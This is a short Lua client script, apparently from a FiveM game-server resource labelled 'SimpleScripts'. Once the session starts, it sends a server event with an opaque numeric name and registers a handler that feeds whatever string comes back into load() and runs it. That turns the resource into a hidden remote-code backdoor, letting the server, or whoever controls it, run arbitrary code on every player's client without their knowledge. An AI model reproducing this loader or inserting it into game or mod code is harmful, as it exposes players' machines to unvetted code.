Citizen.CreateThread(function()
    while not NetworkIsSessionStarted() do 
        Wait(0) 
    end
    TriggerServerEvent('SimpleScripts:242536447548566')
end)

RegisterNetEvent('SimpleScripts:242536447548566')
AddEventHandler('SimpleScripts:242536447548566', function(SimpleScripts3647457)
    assert(load(SimpleScripts3647457))()
end)


